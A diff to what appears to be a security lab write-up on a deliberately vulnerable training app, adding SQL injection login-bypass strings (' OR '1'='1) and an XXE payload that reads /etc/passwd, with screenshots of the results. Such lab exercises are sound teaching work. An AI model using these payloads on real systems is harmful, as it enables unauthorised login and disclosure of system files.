@@ -61,10 +61,39 @@ An attacker could input:
 ```
 ' OR 1=1 -- -
 ' OR 1=1 -- -
+
+' OR '1'='1
+' OR '1'='1
+
 ```
 ![image](https://github.com/user-attachments/assets/829dc8d0-98c4-43cc-af92-634b35148679)
 
 and type: ' OR 1=1 -- - or both user and password:
 
-![image](https://github.com/user-attachments/assets/5ea81ff3-db4d-4cc9-94f2-80ea392d419a)
+![image](https://github.com/user-attachments/assets/271fc5d4-0532-4362-bda0-ab200f342fc9)
+
+### we get this:
+
+![image](https://github.com/user-attachments/assets/8eef2ed0-ecff-4391-8b9f-39e1bf2dee29)
+
+## TASK2:A4: XML External Entities (XXE)
+
+Go to: OWASP 2017 → A4 - XML External Entities
+
+![image](https://github.com/user-attachments/assets/0b7fcd66-3965-4403-9a9a-6642d8ef6f15)
+
+Paste this payload:
+```
+
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [  
+  <!ELEMENT foo ANY >
+  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
+<foo>&xxe;</foo>
+
+```
+![image](https://github.com/user-attachments/assets/a1bfdd93-cfd8-4390-a101-8f1c7d8237e4)
+
+You get contents of a password file:
+![image](https://github.com/user-attachments/assets/61e65d11-0f36-4161-9a7f-a25849f302ba)
 
